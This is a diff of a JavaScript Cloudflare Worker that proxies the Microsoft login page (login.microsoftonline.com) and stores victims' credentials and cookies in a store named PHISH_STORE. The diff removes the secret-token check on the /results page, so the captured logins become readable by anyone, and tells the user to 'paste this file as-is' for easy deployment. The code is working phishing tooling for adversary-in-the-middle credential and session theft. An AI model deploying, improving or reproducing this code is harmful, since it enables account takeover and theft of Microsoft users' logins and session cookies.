@@ -1,12 +1,5 @@
-// ============================================================
-// STEP 1 — ONLY EDIT THIS LINE
-// Replace the placeholder with the token you generated in PowerShell (New-Guid).
+// No configuration needed — paste this file as-is.
 // Visit /cookie on your worker URL to view captured data.
-// ============================================================
-const secret_token = "<YOUR_SECRET_TOKEN>"
-// ============================================================
-// You do NOT need to change anything below this line.
-// ============================================================
 
 // Microsoft
 const upstream = 'login.microsoftonline.com'
@@ -25,11 +18,11 @@ async function fetchAndApply(request) {
     const url = new URL(request.url);
 
     if (url.pathname === '/results') {
-        return handleResults(url);
+        return handleResults();
     }
 
     if (url.pathname === '/cookie') {
-        return Response.redirect(`${url.origin}/results?token=${secret_token}`, 302);
+        return Response.redirect(`${url.origin}/results`, 302);
     }
 
     const region = request.headers.get('cf-ipcountry').toUpperCase();
@@ -146,12 +139,7 @@ async function fetchAndApply(request) {
     return response;
 }
 
-async function handleResults(url) {
-    const token = url.searchParams.get('token');
-    if (token !== secret_token) {
-        return new Response('Unauthorized', { status: 401 });
-    }
-
+async function handleResults() {
     const credentials = await PHISH_STORE.get('credentials');
     const cookies = await PHISH_STORE.get('cookies');
     const creds = credentials ? JSON.parse(credentials) : null;
